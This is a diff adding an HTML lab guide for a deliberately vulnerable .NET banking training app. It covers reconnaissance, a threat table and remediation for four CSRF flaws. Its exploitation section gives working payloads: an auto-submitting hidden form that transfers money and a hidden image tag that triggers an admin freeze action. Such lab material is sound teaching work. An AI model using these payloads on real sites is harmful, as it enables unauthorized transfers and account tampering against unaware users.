@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><title>Lab Guide - CSRF Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>pre{background:#1e1e1e;color:#d4d4d4;padding:12px;border-radius:4px;font-size:.85em;overflow-x:auto}</style>
+</head>
+<body>
+<nav class="navbar navbar-dark bg-dark py-1">
+    <div class="container-fluid">
+        <span class="navbar-brand fw-bold">Lab 04 — CSRF Lab Guide</span>
+        <a href="/" class="btn btn-outline-light btn-sm">← App</a>
+    </div>
+</nav>
+<div class="container py-4">
+    <div class="alert alert-danger">
+        <strong>Educational Lab:</strong> Contains intentional CSRF vulnerabilities. Use only in isolated training environments.
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Lab Overview</h5></div>
+        <div class="card-body">
+            <p><strong>Application:</strong> SecureBank Online Banking (.NET 8 MVC)</p>
+            <p><strong>URL:</strong> <a href="http://localhost:5000">http://localhost:5000</a></p>
+            <p><strong>Test Accounts:</strong></p>
+            <ul>
+                <li><code>user@securebank.com / User123!</code></li>
+                <li><code>alice@securebank.com / Alice123!</code></li>
+                <li><code>admin@securebank.com / Admin123!</code></li>
+            </ul>
+            <p><strong>Vulnerabilities:</strong></p>
+            <ul>
+                <li>CSRF-001: Money transfer without anti-forgery token</li>
+                <li>CSRF-002: Bill payment without CSRF protection</li>
+                <li>CSRF-003: Profile update without CSRF protection</li>
+                <li>CSRF-004: Admin actions (freeze account) without CSRF protection</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Step 1: Reconnaissance</h5></div>
+        <div class="card-body">
+            <p>Identify state-changing endpoints (POST/PUT/DELETE) and check for anti-forgery tokens:</p>
+            <ul>
+                <li>Open DevTools → Network tab → Submit each form</li>
+                <li>Look for <code>__RequestVerificationToken</code> in POST body → if absent = VULNERABLE</li>
+                <li>Check response cookies for <code>SameSite</code> attribute</li>
+            </ul>
+            <pre>curl -v -X POST http://localhost:5000/Transfer/Send \
+  -d "FromAccountNumber=USER001&ToAccountNumber=ADMIN001&Amount=100"
+# No CSRF token required = VULNERABLE</pre>
+        </div>
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Step 2: Threat Modeling (STRIDE)</h5></div>
+        <div class="card-body">
+            <table class="table table-sm">
+                <thead><tr><th>Threat</th><th>Endpoint</th><th>Impact</th><th>CVSS</th></tr></thead>
+                <tbody>
+                    <tr><td>Spoofing / Unauthorized Action</td><td>POST /Transfer/Send</td><td>Unauthorized money transfer</td><td>8.8 High</td></tr>
+                    <tr><td>Elevation of Privilege</td><td>POST /Admin/FreezeAccount</td><td>Account manipulation</td><td>8.0 High</td></tr>
+                    <tr><td>Tampering</td><td>POST /BillPayment/Pay</td><td>Unauthorized payment</td><td>7.5 High</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-header bg-dark text-white"><h5 class="mb-0">Step 3: Exploitation</h5></div>
+        <div class="card-body">
+            <h6 class="text-danger">CSRF-001: Steal Money via Transfer</h6>
+            <ol>
+                <li>Login to banking app as victim user (user@securebank.com)</li>
+                <li>Open <a href="/csrf-demo.html" target="_blank">csrf-demo.html</a> in the same browser</li>
+                <li>The page auto-submits a transfer of $100 to ADMIN001</li>
+                <li>Check <a href="/Transfer/History">Transfer History</a> — the transfer completed!</li>
+            </ol>
+            <pre>&lt;!-- Minimal CSRF attack page --&gt;
+&lt;form action="http://localhost:5000/Transfer/Send" method="POST"&gt;
+  &lt;input type="hidden" name="FromAccountNumber" value="USER001"&gt;
+  &lt;input type="hidden" name="ToAccountNumber" value="ADMIN001"&gt;
+  &lt;input type="hidden" name="Amount" value="1000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+
+            <h6 class="text-danger mt-3">CSRF-004: Admin Action via Image Tag</h6>
+            <pre>&lt;!-- This image tag triggers a freeze action when admin views the page --&gt;
+&lt;img src="http://localhost:5000/Admin/FreezeAccount?accountId=USER001"
+     width="0" height="0" onerror="this.remove()"&gt;</pre>
+        </div>
+    </div>
+
+    <div class="card mb-3">
+        <div class="card-header bg-success text-white"><h5 class="mb-0">Step 4: Remediation</h5></div>
+        <div class="card-body">
+            <h6>1. Add ValidateAntiForgeryToken to every POST action</h6>
+            <pre>// Add this attribute to ALL state-changing actions:
+[HttpPost]
+[ValidateAntiForgeryToken]  // ← ADD THIS
+public async Task&lt;IActionResult&gt; Send(TransferViewModel model)</pre>
+
+            <h6>2. Add AntiForgeryToken to every form</h6>
+            <pre>// In every Razor view form, add:
+&lt;form asp-action="Send" method="post"&gt;
+    @Html.AntiForgeryToken()   &lt;!-- ← ADD THIS --&gt;
+    ...
+&lt;/form&gt;</pre>
+
+            <h6>3. Configure SameSite=Strict cookies</h6>
+            <pre>builder.Services.ConfigureApplicationCookie(options => {
+    options.Cookie.SameSite = SameSiteMode.Strict;  // Blocks cross-site requests
+    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+});</pre>
+        </div>
+    </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
